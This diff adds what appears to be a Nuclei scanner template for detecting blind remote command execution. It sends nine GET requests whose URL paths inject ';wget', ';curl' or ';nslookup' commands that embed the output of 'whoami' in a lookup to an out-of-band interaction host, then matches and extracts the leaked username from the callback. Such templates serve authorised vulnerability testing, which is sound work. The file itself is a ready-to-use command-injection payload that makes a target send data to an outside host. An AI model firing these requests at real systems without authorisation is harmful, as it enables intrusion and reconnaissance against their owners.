@@ -1,0 +1,71 @@
+id: blind-rce-reewardius
+
+info:
+  name: dk4trin and reewardius Blind RCE
+  author: dk4trin,reewardius
+  severity: critical
+  tags: rce,generic
+
+http:
+  - raw:
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+      - |
+        GET /;wget $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+      - |
+        GET /;curl $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}        
+
+      - |
+        GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+      - |
+        GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/html
+
+      - |
+        GET /;nslookup $(whoami).{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
